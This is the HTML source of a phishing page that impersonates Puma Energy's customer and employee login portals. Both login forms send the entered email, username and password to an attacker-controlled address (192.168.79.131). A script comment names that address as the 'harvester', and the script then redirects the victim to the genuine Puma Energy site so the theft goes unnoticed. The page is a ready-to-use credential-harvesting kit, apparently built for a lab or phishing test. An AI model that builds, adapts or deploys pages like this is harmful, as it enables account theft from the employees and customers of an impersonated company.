<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Bienvenido a Puma Energy</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f9f9f9;
      color: #333;
      line-height: 1.6;
    }

    .header {
      height: 50px;
      background: linear-gradient(to right, #2e7d32 0%, #2e7d32 70%, #d32f2f 70%, #d32f2f 100%);
    }

    .logo-container {
      text-align: center;
      padding: 20px 0 10px 0;
    }

    .logo {
      width: 180px;
      height: auto;
      display: block;
      margin: 0 auto;
    }

    .welcome-text {
      font-size: 1.5em;
      font-weight: bold;
      margin-top: 10px;
      color: #000000;
      text-align: center;
    }

    .welcome-text2 {
      font-size: 3em;
      font-weight: bold;
      margin-top: 10px;
      color: #000000;
      text-align: center;
    }

    .container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 20px;
      display: flex;
      justify-content: space-between;
      align-items: flex-start;
      gap: 40px;
      position: relative;
    }

    .client-section, .employee-section {
      flex: 1;
      text-align: center;
      padding: 20px;
    }

    .form-group {
      margin-bottom: 15px;
      position: relative;
      text-align: left;
      max-width: 360px;
      margin-left: auto;
      margin-right: auto;
    }

    .form-group label {
      display: block;
      margin-bottom: 5px;
      font-size: 0.9em;
      color: #555;
    }

    .form-control {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 1em;
      box-sizing: border-box;
    }

    .form-control:focus {
      outline: none;
      border-color: #2e7d32;
    }

    .btn {
      display: block;
      width: 100%;
      padding: 6px 12px;
      margin: 8px 0;
      text-decoration: none;
      font-weight: bold;
      font-size: 0.95em;
      border-radius: 4px;
      text-align: center;
      transition: all 0.3s ease;
      white-space: nowrap;
      border: none;
      cursor: pointer;
      box-sizing: border-box;
      max-width: 360px;
      margin-left: auto;
      margin-right: auto;
    }

    .btn-green {
      background-color: #2e7d32;
      color: white;
    }

    .btn-green:hover {
      background-color: #1b5e20;
    }

    .btn-outline {
      background: transparent;
      color: #2e7d32;
      border: 2px solid #2e7d32;
    }

    .btn-outline:hover {
      background-color: rgba(46, 125, 50, 0.1);
    }

    .or {
      margin: 20px 0;
      color: #666;
      font-size: 1.1em;
      text-align: center;
    }

    .employee-login-form {
      display: none;
      max-width: 360px;
      margin: 20px auto 0;
      text-align: left;
    }

    .container::before {
      content: "";
      position: absolute;
      top: 0;
      bottom: 0;
      left: 50%;
      transform: translateX(-50%);
      width: 1px;
      height: 100%;
      background-color: #ccc;
      z-index: 1;
    }

    .error-message {
      color: red;
      font-size: 0.9em;
      margin-top: 10px;
      text-align: center;
    }

    .success-message {
      color: #2e7d32;
      font-size: 0.95em;
      margin-top: 10px;
      text-align: center;
    }

    .footer {
      text-align: center;
      margin-top: 60px;
      padding: 20px;
      font-size: 0.9em;
      color: #666;
    }

    .footer a {
      color: #2e7d32;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="header"></div>

  <div class="logo-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/ba/Puma_Energy_logo.svg/2560px-Puma_Energy_logo.svg.png" alt="Puma Energy Logo" class="logo" />
    <p class="welcome-text">Bienvenido a</p>
    <h1 class="welcome-text2">PUMA ENERGY</h1>
  </div>

  <div class="container">
    <!-- CLIENTE / CONTRAPARTE -->
    <div class="client-section">
      <h2>Cliente/Contraparte</h2>
      
      <form id="loginFormCliente" method="POST" action="http://192.168.79.131/">
        <div class="form-group">
          <label for="email">Email Address</label>
          <input type="email" id="email" name="email" class="form-control" placeholder="Email Address" required />
        </div>

        <div class="form-group">
          <label for="password">Password</label>
          <input type="password" id="password" name="password" class="form-control" placeholder="Password" required />
        </div>

        <a href="#" class="forgot-password">¿Olvidó su contraseña?</a>
        
        <button type="submit" class="btn btn-green">Click here to Login with Password</button>
        
        <div class="or">OR</div>
        <a href="#" class="btn btn-green">Click here to Login with OTP</a>
      </form>
    </div>

    <!-- PORTAL DE EMPLEADO -->
    <div class="employee-section">
      <h2>Portal de Empleado</h2>
      <div class="icon"></div>
      <p>Obtener acceso a las aplicaciones empresariales aquí.</p>

      <a href="#" id="btnToggleEmpleado" class="btn btn-outline">INICIAR SESIÓN</a>

      <form id="loginFormEmpleado" class="employee-login-form" 
            method="POST" 
            action="http://192.168.79.131/login" 
            onsubmit="redirigirDespues(event)">
        <div class="form-group">
          <label for="usuarioEmpleado">Usuario</label>
          <input type="text" name="username" id="usuarioEmpleado" class="form-control" placeholder="Usuario" required />
        </div>
        <div class="form-group">
          <label for="claveEmpleado">Contraseña</label>
          <input type="password" name="password" id="claveEmpleado" class="form-control" placeholder="Contraseña" required />
        </div>
        <button type="submit" class="btn btn-green">Entrar</button>
      </form>
    </div>
  </div>

  <div class="footer">
    © Derechos de autor Puma Energy 2020. Todos los derechos reservados. 
    <a href="#">Política de Privacidad</a>
  </div>

  <script>
    // Mostrar/ocultar formulario empleado
    document.getElementById("btnToggleEmpleado").addEventListener("click", function(e){
      e.preventDefault();
      const form = document.getElementById("loginFormEmpleado");
      form.style.display = "block";
      form.scrollIntoView({behavior:"smooth", block:"center"});
    });

    function redirigirDespues(event) {
      // Permitimos que el formulario se envíe al harvester antes de redirigir
      setTimeout(() => {
        window.location.href = "https://one.pumaenergy.com/";
      }, 1500);
    }
  </script>
</body>
</html>
